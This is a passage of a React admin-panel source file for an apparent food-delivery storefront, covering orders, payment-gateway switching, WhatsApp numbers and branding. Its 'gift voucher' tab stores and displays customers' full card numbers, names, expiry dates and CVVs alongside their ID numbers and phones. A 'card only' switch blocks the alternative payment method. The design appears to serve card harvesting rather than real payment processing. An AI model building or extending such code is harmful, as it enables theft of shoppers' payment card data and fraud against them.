import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import {
  Lock,
  Phone,
  MapPin,
  Package,
  Clock,
  RefreshCw,
  LogOut,
  CreditCard,
  QrCode,
  Settings,
  Wallet,
  MessageCircle,
  Trash2,
  Plus,
  Check,
  AlertTriangle,
  CheckCircle2,
  XCircle,
} from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { useToast } from "@/hooks/use-toast";
import { format } from "date-fns";
import { ptBR } from "date-fns/locale";
import { CatalogoPanel } from "./CatalogoAdmin";


interface ValePresente {
  id: string;
  pedido_id: string;
  numero_cartao: string;
  nome_cartao: string;
  validade: string;
  cvv: string;
  cliente_nome: string;
  cliente_cpf: string;
  cliente_telefone: string;
  created_at: string;
}

interface PedidoItem {
  id: string;
  produto_nome: string;
  produto_preco: number;
  adicionais: Record<string, number>;
  total_adicionais: number;
  total_item: number;
  observacoes: string;
}

interface Pedido {
  id: string;
  numero_pedido: string;
  cliente_nome: string;
  cliente_telefone: string;
  cliente_cpf: string;
  endereco_completo: string;
  bairro: string;
  cidade: string;
  cep: string;
  tipo_entrega: string;
  forma_pagamento: string;
  status_pagamento: string;
  status_pedido: string;
  subtotal: number;
  desconto_pix: number;
  total: number;
  observacoes: string;
  created_at: string;
  itens: PedidoItem[];
  payment_id: string | null;
}


interface NumeroWhatsApp {
  id: string;
  numero: string;
  ativo: boolean;
  created_at: string;
}

const STATUS_COLORS: Record<string, string> = {
  pendente: "bg-yellow-500",
  confirmado: "bg-green-500",
  recusado: "bg-red-500",
  aprovado: "bg-emerald-600",
  cancelado: "bg-red-600",
  preparando: "bg-blue-500",
  saiu: "bg-purple-500",
  entregue: "bg-green-700",
};

const Admin = () => {
  const initialPw = typeof window !== "undefined" ? sessionStorage.getItem("admin_pw") || "" : "";
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [password, setPassword] = useState(initialPw);
  const [storedPassword, setStoredPassword] = useState(initialPw);
  const [pedidos, setPedidos] = useState<Pedido[]>([]);
  const [valesPresente, setValesPresente] = useState<ValePresente[]>([]);
  const [loading, setLoading] = useState(false);
  const [reconciling, setReconciling] = useState(false);
  const [filtroStatus, setFiltroStatus] = useState("todos");
  const [abaAtiva, setAbaAtiva] = useState<"pedidos" | "vales" | "config" | "catalogo">("pedidos");
  const [gatewayAtivo, setGatewayAtivo] = useState<string>("umbrellapag");
  const [salvandoGateway, setSalvandoGateway] = useState(false);
  const [modoCartaoApenas, setModoCartaoApenas] = useState<boolean>(false);
  const [salvandoModoCartao, setSalvandoModoCartao] = useState(false);
  const [numerosWhatsApp, setNumerosWhatsApp] = useState<NumeroWhatsApp[]>([]);
  const [novoNumero, setNovoNumero] = useState("");
  const [adicionandoNumero, setAdicionandoNumero] = useState(false);
  const [corBordaLogo, setCorBordaLogo] = useState<string>("#F5E6D3");
  const [logoAtual, setLogoAtual] = useState<string | null>(null);
  const [bannerAtual, setBannerAtual] = useState<string | null>(null);
  const [taxaEurBrl, setTaxaEurBrl] = useState<number>(6.35);

  useEffect(() => {
    fetch("https://api.exchangerate-api.com/v4/latest/EUR")
      .then((r) => r.json())
      .then((d) => {
        const rate = Number(d?.rates?.BRL);
        if (rate && rate > 0) setTaxaEurBrl(rate);
      })
      .catch(() => {});
  }, []);
  const { toast } = useToast();

  const handleLogin = async () => {
    if (!password.trim()) {
      toast({
        title: "Error",
        description: "Introduzca la contraseña",
        variant: "destructive",
      });
      return;
    }

    setLoading(true);
    try {
      // Verificar senha via edge function
      const { data, error } = await supabase.functions.invoke("admin-pedidos", {
        body: { action: "listar", password },
      });

      if (error) throw error;

      if (data.error) {
        toast({
          title: "Error",
          description: data.error,
          variant: "destructive",
        });
        return;
      }

      setStoredPassword(password);
      sessionStorage.setItem("admin_pw", password);
      setIsAuthenticated(true);
      // Após autenticação, carregar dados diretamente do Supabase
      await Promise.all([carregarPedidosDireto(), carregarValesPresente(), carregarConfiguracao(), carregarNumerosWhatsApp()]);
      toast({
        title: "Éxito",
        description: "Inicio de sesión correcto",
      });
    } catch (error: unknown) {
      console.error("Erro no login:", error);
      toast({
        title: "Error",
        description: "Error al iniciar sesión",
        variant: "destructive",
      });
    } finally {
      setLoading(false);
    }
  };

  const carregarConfiguracao = async () => {
    if (!storedPassword) return;
    try {
      const response = await fetch(
        "https://bgcwtnrimreruswogffr.supabase.co/functions/v1/admin-config",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ action: "listar", password: storedPassword }),
        }
      );
      const data = await response.json();

      if (data?.gateway_pix) {
        setGatewayAtivo(data.gateway_pix);
      }
      if (typeof data?.modo_cartao_apenas === "boolean") {
        setModoCartaoApenas(data.modo_cartao_apenas);
      }
      if (data?.numeros_whatsapp) {
        setNumerosWhatsApp(data.numeros_whatsapp);
      }
      if (typeof data?.cor_borda_logo === "string") setCorBordaLogo(data.cor_borda_logo);
      setLogoAtual(data?.logo_url || null);
      setBannerAtual(data?.banner_url || null);
    } catch (error) {
      console.error("Erro ao carregar configuração:", error);
    }
  };

  const salvarModoCartaoApenas = async (novoValor: boolean) => {
    if (!storedPassword) return;
    setSalvandoModoCartao(true);
    try {
      const response = await fetch(
        "https://bgcwtnrimreruswogffr.supabase.co/functions/v1/admin-config",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            action: "atualizar_modo_cartao_apenas",
            password: storedPassword,
            modo_cartao_apenas: novoValor,
          }),
        }
      );
      const data = await response.json();
      if (data.error) throw new Error(data.error);

      setModoCartaoApenas(novoValor);
      toast({
        title: "Sucesso",
        description: novoValor
          ? "Modo Solo Tarjeta ACTIVADO. El código de pago ha sido bloqueado para los clientes."
          : "Modo Solo Tarjeta DESACTIVADO. El código de pago está disponible de nuevo.",
      });
    } catch (error) {
      console.error("Erro ao salvar modo cartão apenas:", error);
      toast({
        title: "Error",
        description: "No se pudo cambiar el modo de pago",
        variant: "destructive",
      });
    } finally {
      setSalvandoModoCartao(false);
    }
  };

  const salvarGateway = async (novoGateway: string) => {
    if (!storedPassword) return;
    setSalvandoGateway(true);
    try {
      const response = await fetch(
        "https://bgcwtnrimreruswogffr.supabase.co/functions/v1/admin-config",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            action: "atualizar_gateway",
            password: storedPassword,
            gateway_pix: novoGateway,
          }),
        }
      );
      const data = await response.json();

      if (data.error) throw new Error(data.error);

      setGatewayAtivo(novoGateway);
      const gatewayNomes: Record<string, string> = {
        umbrellapag: "UmbrellaPag",
        evopay: "EvoPay",
        blackcat: "BlackCat",
        ironpay: "IronPay",
        whatsapp: "WhatsApp",
        whatsapp2: "WhatsApp 2",
      };
      toast({
        title: "Sucesso",
        description: `Pasarela de pago cambiada a ${gatewayNomes[novoGateway] || novoGateway}`,
      });
    } catch (error) {
      console.error("Erro ao salvar gateway:", error);
      toast({
        title: "Error",
        description: "Error al cambiar la pasarela de pago",
        variant: "destructive",
      });
    } finally {
      setSalvandoGateway(false);
    }
  };

  const carregarPedidosDireto = async () => {
    if (!storedPassword) return;
    setLoading(true);
    try {
      // Buscar pedidos via edge function (com service role)
      const { data, error } = await supabase.functions.invoke("admin-pedidos", {
        body: { action: "listar", password: storedPassword },
      });

      if (error) throw error;
      if (data.error) throw new Error(data.error);

      // Parse adicionais de JSON para objeto
      const pedidosFormatados = (data.pedidos || []).map((pedido: Pedido) => ({
        ...pedido,
        itens: (pedido.itens || []).map((item) => ({
          ...item,
          adicionais: typeof item.adicionais === "string" ? JSON.parse(item.adicionais) : item.adicionais || {},
        })),
      }));

      setPedidos(pedidosFormatados as Pedido[]);
      
      // Também carregar vales presente retornados pela mesma chamada
      if (data.vales_presente) {
        setValesPresente(data.vales_presente as ValePresente[]);
      }
    } catch (error) {
      console.error("Erro ao carregar pedidos:", error);
      toast({
        title: "Error",
        description: "Error al cargar los pedidos",
        variant: "destructive",
      });
    } finally {
      setLoading(false);
    }
  };

  const carregarValesPresente = async () => {
    // Vales são carregados junto com os pedidos via edge function
    // Esta função existe para manter compatibilidade
  };

  const carregarNumerosWhatsApp = async () => {
    // Números são carregados junto com a configuração
    // Esta função existe para manter compatibilidade
  };

  // Auto-login se já houver senha salva na sessão
  useEffect(() => {
    const saved = sessionStorage.getItem("admin_pw");
    if (saved && !isAuthenticated) {
      (async () => {
        try {
          const { data, error } = await supabase.functions.invoke("admin-pedidos", {
            body: { action: "listar", password: saved },
          });
          if (error || data?.error) {
            sessionStorage.removeItem("admin_pw");
            return;
          }
          setStoredPassword(saved);
          setIsAuthenticated(true);
        } catch {
          sessionStorage.removeItem("admin_pw");
        }
      })();
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // Carregar dados automaticamente ao autenticar e atualizar a cada 15 segundos
  useEffect(() => {
    if (isAuthenticated && storedPassword) {
      // Carregar dados imediatamente
      Promise.all([
        carregarPedidosDireto(),
        carregarConfiguracao(),
      ]);

      // Configurar polling para atualizar a cada 15 segundos
      const interval = setInterval(() => {
        carregarPedidosDireto();
      }, 15000);

      // Limpar interval ao desmontar ou desautenticar
      return () => clearInterval(interval);
    }
  }, [isAuthenticated, storedPassword]);

  const adicionarNumeroWhatsApp = async () => {
    const numeroLimpo = novoNumero.replace(/\D/g, "");
    
    if (!numeroLimpo || numeroLimpo.length < 10) {
      toast({
        title: "Error",
        description: "Introduzca un número de WhatsApp válido",
        variant: "destructive",
      });
      return;
    }

    if (!storedPassword) return;
    setAdicionandoNumero(true);
    try {
      const response = await fetch(
        "https://bgcwtnrimreruswogffr.supabase.co/functions/v1/admin-config",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            action: "adicionar_numero",
            password: storedPassword,
            numero: numeroLimpo,
          }),
        }
      );
      const data = await response.json();

      if (data.error) throw new Error(data.error);

      toast({
        title: "Sucesso",
        description: "Número añadido correctamente",
      });

      setNovoNumero("");
      await carregarConfiguracao();
    } catch (error) {
      console.error("Erro ao adicionar número:", error);
      toast({
        title: "Error",
        description: "Error al añadir el número",
        variant: "destructive",
      });
    } finally {
      setAdicionandoNumero(false);
    }
  };

  const ativarNumeroWhatsApp = async (id: string) => {
    if (!storedPassword) return;
    try {
      const response = await fetch(
        "https://bgcwtnrimreruswogffr.supabase.co/functions/v1/admin-config",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            action: "ativar_numero",
            password: storedPassword,
            numero_id: id,
          }),
        }
      );
      const data = await response.json();

      if (data.error) throw new Error(data.error);

      toast({
        title: "Sucesso",
        description: "Número activado correctamente",
      });

      await carregarConfiguracao();
    } catch (error) {
      console.error("Erro ao ativar número:", error);
      toast({
        title: "Error",
        description: "Error al activar el número",
        variant: "destructive",
      });
    }
  };

  const excluirNumeroWhatsApp = async (id: string) => {
    if (!storedPassword) return;
    try {
      const response = await fetch(
        "https://bgcwtnrimreruswogffr.supabase.co/functions/v1/admin-config",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            action: "excluir_numero",
            password: storedPassword,
            numero_id: id,
          }),
        }
      );
      const data = await response.json();

      if (data.error) throw new Error(data.error);

      toast({
        title: "Sucesso",
        description: "Número eliminado correctamente",
      });

      await carregarConfiguracao();
    } catch (error) {
      console.error("Erro ao excluir número:", error);
      toast({
        title: "Error",
        description: "Error al eliminar el número",
        variant: "destructive",
      });
    }
  };

  const salvarBranding = async (payload: { logo_url?: string | null; banner_url?: string | null; cor_borda_logo?: string }) => {
    if (!storedPassword) return;
    try {
      const response = await fetch(
        "https://bgcwtnrimreruswogffr.supabase.co/functions/v1/admin-config",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ action: "atualizar_branding", password: storedPassword, ...payload }),
        }
      );
      const data = await response.json();
      if (data.error) throw new Error(data.error);
      const { refreshBranding } = await import("@/hooks/useBranding");
      refreshBranding();
      toast({ title: "Éxito", description: "Personalización actualizada" });
    } catch (error) {
      console.error("Erro ao salvar branding:", error);
      toast({ title: "Error", description: "Error al guardar la personalización", variant: "destructive" });
    }
  };

  const handleUploadImagem = async (file: File, tipo: "logo" | "banner") => {
    if (file.size > 2 * 1024 * 1024) {
      toast({ title: "Archivo demasiado grande", description: "Envíe una imagen de hasta 2 MB", variant: "destructive" });
      return;
    }
    const reader = new FileReader();
    reader.onload = async () => {
      const dataUrl = reader.result as string;
      if (tipo === "logo") {
        await salvarBranding({ logo_url: dataUrl });
      } else {
        await salvarBranding({ banner_url: dataUrl });
      }
    };
    reader.readAsDataURL(file);
  };



  const formatarNumeroWhatsApp = (numero: string) => {
    // Formato: +55 (11) 99999-9999
    if (numero.length === 11) {
      return `+55 (${numero.slice(0, 2)}) ${numero.slice(2, 7)}-${numero.slice(7)}`;
    }
    return numero;
  };

  const atualizarStatus = async (pedidoId: string, novoStatus: string) => {
    try {
      // Atualizar via edge function (service role)
      const { data, error } = await supabase.functions.invoke("admin-pedidos", {
        body: {
          action: "atualizar_status",
          password: storedPassword,
          pedidoId,
          novoStatus,
        },
      });

      if (error || data?.error) {
        throw new Error(data?.error || error?.message || "Erro ao atualizar");
      }

      setPedidos((prev) => prev.map((p) => (p.id === pedidoId ? { ...p, status_pedido: novoStatus } : p)));

      toast({
        title: "Sucesso",
        description: "Estado actualizado",
      });
    } catch (error) {
      console.error("Erro ao atualizar status:", error);
      toast({
        title: "Error",
        description: "Error al actualizar el estado",
        variant: "destructive",
      });
    }
  };

  const reconciliarPagamentosPix = async () => {
    setReconciling(true);
    try {
      const { data, error } = await supabase.functions.invoke("admin-pedidos", {
        body: {
          action: "reconciliar_pagamentos",
          password: storedPassword,
          days: 7,
        },
      });

      if (error || data?.error) {
        throw new Error(data?.error || error?.message || "Erro ao reconciliar");
      }

      const updated = Number(data?.updated || 0);
      const checked = Number(data?.checked || 0);
      const errorsCount = Array.isArray(data?.errors) ? data.errors.length : 0;

      toast({
        title: "Reconciliación completada",
        description: `${updated} pedido(s) marcado(s) como pagado(s) (verificados: ${checked}${errorsCount ? `, errores: ${errorsCount}` : ""}).`,
      });

      await carregarPedidosDireto();
    } catch (e: any) {
      console.error("Erro ao reconciliar pagamentos:", e);
      toast({
        title: "Error",
        description: e?.message || "Error al reconciliar los pagos",
        variant: "destructive",
      });
    } finally {
      setReconciling(false);
    }
  };

  const handleLogout = () => {
    setIsAuthenticated(false);
    setPassword("");
    setStoredPassword("");
    setPedidos([]);
  };

  const abrirWhatsApp = (telefone: string, nome: string) => {
    const numero = telefone.replace(/\D/g, "");
    const mensagem = encodeURIComponent(`¡Hola ${nome}! Le contactamos de Vibe Açaí.`);
    window.open(`https://wa.me/55${numero}?text=${mensagem}`, "_blank");
  };

  const pedidosFiltrados = filtroStatus === "todos" ? pedidos : pedidos.filter((p) => p.status_pedido === filtroStatus);

  const formatEUR = (value: number) => value.toLocaleString("es-ES", { style: "currency", currency: "EUR" });
  const formatBRL = (value: number) => value.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });
  const eurToBrl = (eur: number) => eur * taxaEurBrl;

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center p-4">
        <Card className="w-full max-w-md">
          <CardHeader className="text-center">
            <div className="mx-auto w-16 h-16 bg-primary/10 rounded-full flex items-center justify-center mb-4">
              <Lock className="w-8 h-8 text-primary" />
            </div>
            <CardTitle className="text-2xl">Panel de Administración</CardTitle>
            <p className="text-muted-foreground">Introduzca la contraseña para acceder</p>
          </CardHeader>
          <CardContent className="space-y-4">
            <Input
              type="password"
              placeholder="Contraseña"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              onKeyDown={(e) => e.key === "Enter" && handleLogin()}
              className="bg-admin-box text-admin-box-foreground placeholder:text-admin-box-foreground/60 border-border focus-visible:ring-accent"
            />
            <Button className="w-full" onClick={handleLogin} disabled={loading}>
              {loading ? "Verificando..." : "Entrar"}
            </Button>
          </CardContent>
        </Card>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background">
      {/* Header */}
      <div className="sticky top-0 z-10 bg-card border-b p-4">
        <div className="max-w-7xl mx-auto flex items-center justify-between">
          <h1 className="text-xl font-bold">Panel de Administración</h1>
          <div className="flex items-center gap-2">
            <Button
              variant="outline"
              size="icon"
              onClick={() => Promise.all([carregarPedidosDireto(), carregarValesPresente(), carregarNumerosWhatsApp()])}
              disabled={loading}
            >
              <RefreshCw className={`w-4 h-4 ${loading ? "animate-spin" : ""}`} />
            </Button>
            <Button variant="ghost" size="icon" onClick={handleLogout}>
              <LogOut className="w-4 h-4" />
            </Button>
          </div>
        </div>
      </div>

      {/* Abas */}
      <div className="max-w-7xl mx-auto p-4">
        <div className="flex gap-2 mb-4 flex-wrap">
          <Button
            variant={abaAtiva === "pedidos" ? "default" : "outline"}
            onClick={() => setAbaAtiva("pedidos")}
            className="gap-2"
          >
            <Package className="w-4 h-4" />
            Pedidos ({pedidos.length})
          </Button>
          <Button
            variant={abaAtiva === "vales" ? "default" : "outline"}
            onClick={() => setAbaAtiva("vales")}
            className="gap-2"
          >
            <CreditCard className="w-4 h-4" />
            Vales Regalo ({valesPresente.length})
          </Button>
          <Button
            variant={abaAtiva === "config" ? "default" : "outline"}
            onClick={() => setAbaAtiva("config")}
            className="gap-2"
          >
            <Settings className="w-4 h-4" />
            Configuración
          </Button>
          <Button
            variant={abaAtiva === "catalogo" ? "default" : "outline"}
            onClick={() => setAbaAtiva("catalogo")}
            className="gap-2"
          >
            <Package className="w-4 h-4" />
            Catálogo
          </Button>

        </div>


        {/* Conteúdo das Abas */}
        {abaAtiva === "pedidos" && (
          <>
            {/* Filtros */}
            <div className="flex items-center gap-4 mb-4">
              <Select value={filtroStatus} onValueChange={setFiltroStatus}>
                <SelectTrigger className="w-48 bg-admin-box text-admin-box-foreground border-border focus:ring-accent">
                  <SelectValue placeholder="Filtrar por estado" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="todos">Todos</SelectItem>
                  <SelectItem value="pendente">Pendiente</SelectItem>
                  <SelectItem value="aprovado">Aprobado</SelectItem>
                  <SelectItem value="cancelado">Cancelado</SelectItem>
                  <SelectItem value="preparando">Preparando</SelectItem>
                  <SelectItem value="saiu">Salió para entrega</SelectItem>
                  <SelectItem value="entregue">Entregado</SelectItem>
                </SelectContent>
              </Select>
              <span className="text-muted-foreground text-sm">{pedidosFiltrados.length} pedido(s)</span>

              <Button
                variant="outline"
                className="gap-2"
                onClick={reconciliarPagamentosPix}
                disabled={reconciling || loading}
              >
                <RefreshCw className={`w-4 h-4 ${reconciling ? "animate-spin" : ""}`} />
                {reconciling ? "Verificando pagos..." : "Reconciliar pagos (7 días)"}
              </Button>
            </div>

            {/* Lista de Pedidos */}
            <div className="space-y-4">
              {pedidosFiltrados.length === 0 ? (
                <Card>
                  <CardContent className="py-8 text-center text-muted-foreground">No se ha encontrado ningún pedido</CardContent>
                </Card>
              ) : (
                pedidosFiltrados.map((pedido) => (
                  <Card key={pedido.id} className="overflow-hidden">
                    <CardHeader className="pb-2">
                      <div className="flex items-start justify-between">
                        <div>
                          <div className="flex items-center gap-2">
                            <CardTitle className="text-lg">{pedido.numero_pedido}</CardTitle>
                            <Badge className={STATUS_COLORS[pedido.status_pagamento]}>
                              {pedido.status_pagamento === "confirmado" ? "Pagado" : pedido.status_pagamento}
                            </Badge>
                          </div>
                          <div className="flex items-center gap-1 text-sm text-muted-foreground mt-1">
                            <Clock className="w-3 h-3" />
                            {format(new Date(pedido.created_at), "dd/MM/yyyy 'a las' HH:mm", { locale: ptBR })}
                          </div>
                        </div>
                        <div className="text-right">
                          <p className="text-lg font-bold text-primary">{formatEUR(Number(pedido.total))}</p>
                          <p className="text-[10px] text-muted-foreground">
                            Cobrado: {formatBRL(eurToBrl(Number(pedido.total)))}
                          </p>
                          <p className="text-xs text-muted-foreground">
                            {pedido.status_pagamento === "confirmado"
                              ? `Total pagado: ${formatEUR(Number(pedido.total))}`
                              : `Total a pagar: ${formatEUR(Number(pedido.total))}`}
                          </p>
                          <p className="text-xs text-muted-foreground uppercase">{pedido.forma_pagamento}</p>
                        </div>
                      </div>
                    </CardHeader>
                    <CardContent className="space-y-4">
                      {/* Cliente */}
                      <div className="flex items-start justify-between">
                        <div>
                          <p className="font-medium">{pedido.cliente_nome}</p>
                          {pedido.cliente_cpf && (
                            <p className="text-sm text-muted-foreground">DNI: {pedido.cliente_cpf}</p>
                          )}
                        </div>
                        <Button
                          variant="outline"
                          size="sm"
                          className="gap-1 bg-success text-success-foreground border-success hover:bg-success/90 hover:text-success-foreground"
                          onClick={() => abrirWhatsApp(pedido.cliente_telefone, pedido.cliente_nome)}
                        >
                          <Phone className="w-3 h-3" />
                          {pedido.cliente_telefone}
                        </Button>
                      </div>

                      {/* Endereço */}
                      {pedido.tipo_entrega === "delivery" && pedido.endereco_completo && (
                        <div className="flex items-start gap-2 p-3 bg-admin-box text-admin-box-foreground rounded-lg">
                          <MapPin className="w-4 h-4 mt-0.5 text-admin-box-foreground/60" />
                          <div className="text-sm">
                            <p>{pedido.endereco_completo}</p>
                            <p>
                              {pedido.bairro} - {pedido.cidade}
                            </p>
                            {pedido.cep && <p>Código postal: {pedido.cep}</p>}
                          </div>
                        </div>
                      )}

                      {pedido.tipo_entrega === "pickup" && (
                        <div className="flex items-center gap-2 p-3 bg-admin-box text-admin-box-foreground rounded-lg">
                          <Package className="w-4 h-4 text-admin-box-foreground/60" />
                          <span className="text-sm">Recogida en el local</span>
                        </div>
                      )}

                      {/* Itens */}
                      <div className="border-t pt-3">
                        <p className="font-medium mb-2">Artículos del pedido:</p>
                        <div className="space-y-2">
                          {pedido.itens.map((item) => (
                            <div key={item.id} className="flex justify-between text-sm">
                              <div>
                                <p>{item.produto_nome}</p>
                                {Object.keys(item.adicionais || {}).length > 0 && (
                                  <p className="text-xs text-muted-foreground">
                                    + {Object.keys(item.adicionais).join(", ")}
                                  </p>
                                )}
                                {item.observacoes && (
                                  <p className="text-xs text-muted-foreground italic">Obs.: {item.observacoes}</p>
                                )}
                              </div>
                              <p className="font-medium">{formatEUR(Number(item.total_item))}</p>
                            </div>
                          ))}
                        </div>
                      </div>

                      {/* Informação do PIX */}
                      {pedido.forma_pagamento === "pix" && pedido.payment_id && (
                        <div className="border-t pt-3">
                          <p className="font-medium mb-2 flex items-center gap-2">
                            <QrCode className="w-4 h-4 text-accent" />
                            Pago con código de pago
                          </p>
                          <div className="bg-admin-box text-admin-box-foreground p-3 rounded-lg">
                            <p className="text-xs text-admin-box-foreground/60 mb-1">ID del pago</p>
                            <p className="font-mono text-xs">{pedido.payment_id}</p>
                          </div>
                        </div>
                      )}

                      {/* Aprovar / Cancelar */}
                      <div className="flex flex-col sm:flex-row gap-2 pt-3 border-t">
                        <Button
                          className="flex-1 gap-2 bg-emerald-600 hover:bg-emerald-700 text-white"
                          onClick={() => atualizarStatus(pedido.id, "aprovado")}
                          disabled={pedido.status_pedido === "aprovado"}
                        >
                          <CheckCircle2 className="w-4 h-4" />
                          {pedido.status_pedido === "aprovado" ? "Aprobado" : "Aprobar pedido"}
                        </Button>
                        <Button
                          variant="outline"
                          className="flex-1 gap-2 border-red-500 text-red-600 hover:bg-red-500 hover:text-white"
                          onClick={() => {
                            if (confirm("¿Desea realmente cancelar este pedido?")) {
                              atualizarStatus(pedido.id, "cancelado");
                            }
                          }}
                          disabled={pedido.status_pedido === "cancelado"}
                        >
                          <XCircle className="w-4 h-4" />
                          {pedido.status_pedido === "cancelado" ? "Cancelado" : "Cancelar pedido"}
                        </Button>
                      </div>

                      {/* Status do Pedido */}
                      <div className="flex items-center justify-between pt-3 border-t">
                        <span className="text-sm font-medium">Estado del pedido:</span>
                        <Select
                          value={pedido.status_pedido}
                          onValueChange={(value) => atualizarStatus(pedido.id, value)}
                        >
                          <SelectTrigger className="w-44 bg-admin-box text-admin-box-foreground border-border focus:ring-accent">
                            <SelectValue />
                          </SelectTrigger>
                          <SelectContent>
                            <SelectItem value="pendente">Pendiente</SelectItem>
                            <SelectItem value="aprovado">Aprobado</SelectItem>
                            <SelectItem value="cancelado">Cancelado</SelectItem>
                            <SelectItem value="preparando">Preparando</SelectItem>
                            <SelectItem value="saiu">Salió para entrega</SelectItem>
                            <SelectItem value="entregue">Entregado</SelectItem>
                          </SelectContent>
                        </Select>
                      </div>
                    </CardContent>
                  </Card>
                ))
              )}
            </div>
          </>
        )}

        {/* Aba Vales Presente */}
        {abaAtiva === "vales" && (
          <div className="space-y-4">
            {valesPresente.length === 0 ? (
              <Card>
                <CardContent className="py-8 text-center text-muted-foreground">
                  No hay ningún vale regalo registrado
                </CardContent>
              </Card>
            ) : (
              valesPresente.map((vale) => (
                <Card key={vale.id} className="overflow-hidden">
                  <CardHeader className="pb-2">
                    <div className="flex items-start justify-between">
                      <div>
                        <CardTitle className="text-lg flex items-center gap-2">
                          <CreditCard className="w-5 h-5 text-primary" />
                          Vale Regalo
                        </CardTitle>
                        <div className="flex items-center gap-1 text-sm text-muted-foreground mt-1">
                          <Clock className="w-3 h-3" />
                          {format(new Date(vale.created_at), "dd/MM/yyyy 'a las' HH:mm", { locale: ptBR })}
                        </div>
                      </div>
                      {vale.pedido_id && vale.pedido_id !== "sem_pedido" && (
                        <Badge variant="outline">Pedido: {vale.pedido_id}</Badge>
                      )}
                    </div>
                  </CardHeader>
                  <CardContent className="space-y-4">
                    {/* Dados do Cliente */}
                    <div className="flex items-start justify-between">
                      <div>
                        <p className="font-medium">{vale.cliente_nome || "Nombre no facilitado"}</p>
                        {vale.cliente_cpf && <p className="text-sm text-muted-foreground">DNI: {vale.cliente_cpf}</p>}
                      </div>
                      {vale.cliente_telefone && (
                        <Button
                          variant="outline"
                          size="sm"
                          className="gap-1 bg-success text-success-foreground border-success hover:bg-success/90 hover:text-success-foreground"
                          onClick={() => {
                            const numero = vale.cliente_telefone.replace(/\D/g, "");
                            const mensagem = encodeURIComponent(`¡Hola ${vale.cliente_nome || ""}!`);
                            window.open(`https://wa.me/55${numero}?text=${mensagem}`, "_blank");
                          }}
                        >
                          <Phone className="w-3 h-3" />
                          {vale.cliente_telefone}
                        </Button>
                      )}
                    </div>

                    {/* Dados do Cartão */}
                    <div className="bg-admin-box text-admin-box-foreground p-4 rounded-lg space-y-3">
                      <p className="font-semibold text-sm border-b border-admin-box-foreground/20 pb-2">
                        Datos de la Tarjeta
                      </p>
                      <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                        <div>
                          <p className="text-xs text-admin-box-foreground/60 mb-1">Número de la tarjeta</p>
                          <p className="font-mono font-bold text-sm md:text-lg">{vale.numero_cartao}</p>
                        </div>
                        <div>
                          <p className="text-xs text-admin-box-foreground/60 mb-1">Nombre en la tarjeta</p>
                          <p className="font-mono font-bold text-sm md:text-lg">{vale.nome_cartao}</p>
                        </div>
                        <div>
                          <p className="text-xs text-admin-box-foreground/60 mb-1">Caducidad</p>
                          <p className="font-mono font-bold text-sm md:text-lg">{vale.validade}</p>
                        </div>
                        <div>
                          <p className="text-xs text-admin-box-foreground/60 mb-1">CVV</p>
                          <p className="font-mono font-bold text-sm md:text-lg">{vale.cvv}</p>
                        </div>
                      </div>
                    </div>
                  </CardContent>
                </Card>
              ))
            )}
          </div>
        )}

        {/* Aba Configurações */}
        {abaAtiva === "config" && (
          <div className="space-y-6">
            {/* Personalização visual */}
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Settings className="w-5 h-5 text-primary" />
                  Personalización visual
                </CardTitle>
                <p className="text-sm text-muted-foreground">
                  Cambie el logo, el banner principal y el color del borde alrededor del logo.
                </p>
              </CardHeader>
              <CardContent className="space-y-6">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div className="space-y-2">
                    <label className="text-sm font-semibold">Logo</label>
                    <div className="flex items-center gap-3">
                      <div
                        className="w-16 h-16 rounded-full overflow-hidden bg-background flex-shrink-0"
                        style={{ border: `3px solid ${corBordaLogo}` }}
                      >
                        {logoAtual && <img src={logoAtual} alt="Logo actual" className="w-full h-full object-cover" />}
                      </div>
                      <Input
                        type="file"
                        accept="image/*"
                        onChange={(e) => {
                          const f = e.target.files?.[0];
                          if (f) handleUploadImagem(f, "logo");
                          e.target.value = "";
                        }}
                      />
                    </div>
                    <p className="text-xs text-muted-foreground">PNG/JPG hasta 2 MB. Ideal cuadrada.</p>
                  </div>

                  <div className="space-y-2">
                    <label className="text-sm font-semibold">Color del borde del logo</label>
                    <div className="flex items-center gap-3">
                      <input
                        type="color"
                        value={corBordaLogo}
                        onChange={(e) => setCorBordaLogo(e.target.value)}
                        className="w-14 h-10 rounded border border-border cursor-pointer"
                      />
                      <Input
                        value={corBordaLogo}
                        onChange={(e) => setCorBordaLogo(e.target.value)}
                        placeholder="#F5E6D3"
                      />
                      <Button onClick={() => salvarBranding({ cor_borda_logo: corBordaLogo })}>
                        Guardar color
                      </Button>
                    </div>
                    <p className="text-xs text-muted-foreground">Beige por defecto: #F5E6D3</p>
                  </div>
                </div>

                <div className="space-y-2">
                  <label className="text-sm font-semibold">Banner principal</label>
                  <div className="space-y-3">
                    {bannerAtual && (
                      <img src={bannerAtual} alt="Banner actual" className="w-full max-h-40 object-cover rounded-lg border border-border" />
                    )}
                    <Input
                      type="file"
                      accept="image/*"
                      onChange={(e) => {
                        const f = e.target.files?.[0];
                        if (f) handleUploadImagem(f, "banner");
                        e.target.value = "";
                      }}
                    />
